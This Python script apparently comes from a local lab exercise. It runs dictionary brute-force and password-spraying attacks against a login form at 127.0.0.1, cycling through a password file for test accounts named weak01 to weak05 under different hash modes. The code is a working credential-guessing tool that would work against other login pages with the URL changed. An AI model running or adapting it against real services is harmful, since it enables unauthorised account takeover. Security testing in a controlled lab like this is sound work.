import requests

LOGIN_URL = "http://127.0.0.1:5000/login"


def try_login(username, password, hashmode):
    session = requests.Session()
    response = session.post(
        LOGIN_URL,
        data={
            "username": username,
            "password": password,
            "hash_mode": hashmode
        },
        allow_redirects=True
    )

    if "Welcome" in response.text or "test" in response.url:
        return True
    else:
        return False


def bruteforce(filename, username, hashmode):
    with open(filename, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            print(f"trying: {username},{line}")
            if try_login(username, line, hashmode):
                return True
    return False


def password_spraying(filename, users, hashmode):
    successful_cracks = {}
    with open(filename, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            for user in users:
                print(f"trying: {user},{line}")
                if try_login(user, line, hashmode):
                    successful_cracks[user] = line
                    if len(successful_cracks) == 3:
                        return successful_cracks
    return successful_cracks


def main():
    hashmodes = ["sha256", "bcrypt", "argon2"]
    users = ["weak01","weak02","weak03","weak04","weak05"]
    # if bruteforce("passwords.txt", "weak04", hashmodes[0]):
    #     print("Cracked")
    # else:
    #     print("Failed")
    dic = password_spraying("passwords.txt",users,hashmodes[0])
    print(dic)




if __name__ == "__main__":
    main()
